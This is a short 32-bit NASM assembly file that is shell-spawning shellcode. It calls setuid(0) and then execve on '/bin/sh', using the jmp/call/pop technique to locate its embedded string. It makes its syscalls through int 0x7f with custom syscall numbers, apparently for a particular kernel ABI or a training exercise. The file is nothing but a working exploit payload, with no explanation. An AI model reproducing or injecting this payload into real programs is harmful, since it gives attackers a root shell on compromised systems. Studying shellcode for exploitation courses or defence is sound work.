BITS 32

%define NR_execve 7
%define NR_setuid 24

    xor eax, eax
    add al, NR_setuid
    xor ebx, ebx
    int 0x7f
    jmp short end
start:
    pop ebx
    xor eax, eax
    mov [ebx+7], al
    mov [ebx+8], ebx
    mov [ebx+12], eax
    add al, NR_execve
    lea ecx, [ebx+8]
    lea edx, [ebx+12]
    int 0x7f
    xor eax, eax
    int 0x7f
end:
    call start
db "/bin/shh"
db "XXXXXXXX"
